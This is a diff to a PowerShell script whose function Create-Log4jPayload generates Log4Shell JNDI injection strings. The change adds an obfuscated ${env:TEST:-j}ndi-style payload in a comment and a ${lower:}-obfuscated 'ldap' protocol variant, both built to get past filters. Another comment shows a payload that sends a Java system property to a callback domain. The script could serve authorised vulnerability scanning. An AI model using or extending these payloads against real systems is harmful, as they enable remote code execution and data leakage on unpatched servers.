@@ -3,6 +3,7 @@
 # Todo: encoding, more command viations, protocol variations?
 # Notes: You can likely inject into RMI endpoints as well, is anyone looking for endpionts for known platforms exposed to the internet?
 # May need to add to the backend too: ${jndi:ldap:/callback.domain.com/${sys:java.vendor.url}} - just add the $MidPos2 to $EndPos; remove . and add /
+# this one is still pending - ${${env:TEST:-j}ndi${env:TEST:-:}${env:TEST:-l}dap${env:TEST:-:}//example.com}
 function Create-Log4jPayload
 (
     [Parameter(Position = 0)][System.String]$Domain,
@@ -14,6 +15,7 @@ function Create-Log4jPayload
     $Protocol = new-object System.Data.DataTable 
     $null = $Protocol.Columns.Add("value")
     $null = $Protocol.Rows.Add("ldap")
+    $null = $Protocol.Rows.Add("`${lower:l}`${lower:d}a`${lower:p}")
     $null = $Protocol.Rows.Add("rmi")
 
     # Create list of presubdomain values for postion 1
